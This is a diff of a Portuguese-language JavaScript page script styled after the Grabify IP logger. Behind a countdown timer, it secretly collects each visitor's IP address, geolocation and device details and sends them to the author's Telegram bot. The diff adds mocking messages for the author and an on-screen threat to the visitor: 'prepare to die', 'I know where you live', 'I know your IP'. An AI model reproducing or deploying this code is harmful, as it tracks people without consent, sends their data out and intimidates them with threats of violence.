@@ -1,6 +1,6 @@
-// script.js - Smart Logger estilo Grabify (versão final)
+// script.js - Timer + Mensagens Pesadas (Telegram + Tela)
 
-let targetDate = new Date("2026-04-20T01:54:59").getTime();
+let targetDate = new Date("2026-04-20T02:03:59").getTime();
 let userIPv4 = '';
 let userLatitude = '';
 let userLongitude = '';
@@ -25,12 +25,11 @@ function getDeviceInfo() {
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
         deviceMemory: ram,
-        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-        batteryLevel: 'Não disponível',
-        isCharging: 'Não disponível'
+        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
     };
 }
 
+// ==================== MENSAGEM PARA O TELEGRAM (pra você) ====================
 function sendToTelegram() {
     if (alreadySent) return;
     alreadySent = true;
@@ -52,8 +51,11 @@ function sendToTelegram() {
                     `• Fuso horário: ${device.timezone}\n` +
                     `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
                     `• Memória RAM aprox: ${device.deviceMemory}\n` +
-                    `🔋 Bateria: ${device.batteryLevel} | Carregando: ${device.isCharging}\n` +
-                    `🌐 Online: Sim\n\n` +
+                    `• Portas abertas: Não possível detectar\n\n` +
+                    `===================================\n` +
+                    `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
+                    `Que patético, mano...\n\n` +
+                    `Esse cara é betinha HAHAAHAHAHAHAAHAH\n\n` +
                     `Não é magia, é habilidade isto...`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -63,9 +65,25 @@ function sendToTelegram() {
     })
     .then(res => res.json())
     .then(data => {
-        if (data.ok) console.log("✅ Enviado para Telegram com sucesso!");
+        if (data.ok) console.log("✅ Enviado pro Telegram!");
     })
-    .catch(err => console.error("Erro ao enviar para Telegram:", err));
+    .catch(err => console.error("Erro Telegram:", err));
+}
+
+// ==================== MENSAGEM QUE APARECE NA TELA DO USUÁRIO ====================
+function showFinalMessageOnScreen() {
+    document.getElementById("timer").innerHTML = `
+        Tempo esgotado!<br><br>
+        Prepare-se para morrer, seu lixo...<br><br>
+        Eu sei onde você mora.<br>
+        Eu sei o seu IP.<br>
+        Eu sei qual merda de computador você usa.<br><br>
+        Você é um fracassado.<br>
+        Um inútil.<br>
+        Um perdedor patético.<br><br>
+        Não é magia, é habilidade isto...<br>
+        <span style="font-size: 1.2rem; color: #ff0000;">E você continua sendo um nada.</span>
+    `;
 }
 
 function updateTimer() {
@@ -74,16 +92,8 @@ function updateTimer() {
 
     if (timeLeft < 0) {
         clearInterval(timerInterval);
-        
-        document.getElementById("timer").innerHTML = `
-            Tempo esgotado!<br>
-            Prepare-se para morrer...<br><br>
-            Você mora em: ${userLatitude || 'não disponível'}, ${userLongitude || 'não disponível'}<br>
-            Seu IP é: ${userIPv4 || 'não disponível'}<br><br>
-            Não é magia, é habilidade isto...
-        `;
-
-        sendToTelegram();
+        showFinalMessageOnScreen();   // Mensagem pesada na tela
+        sendToTelegram();             // Mensagem pesada no Telegram
         return;
     }
 
@@ -98,7 +108,7 @@ function updateTimer() {
     `;
 }
 
-// Busca IP + Localização (ip-api.com)
+// Busca IP + Localização
 fetch('https://api.ipify.org?format=json')
     .then(r => r.json())
     .then(data => {
@@ -112,7 +122,7 @@ fetch('https://api.ipify.org?format=json')
             userLongitude = data.lon || '';
         }
     })
-    .catch(err => console.error("Erro na busca de localização:", err));
+    .catch(err => console.error("Erro na localização:", err));
 
 timerInterval = setInterval(updateTimer, 100);
 updateTimer();
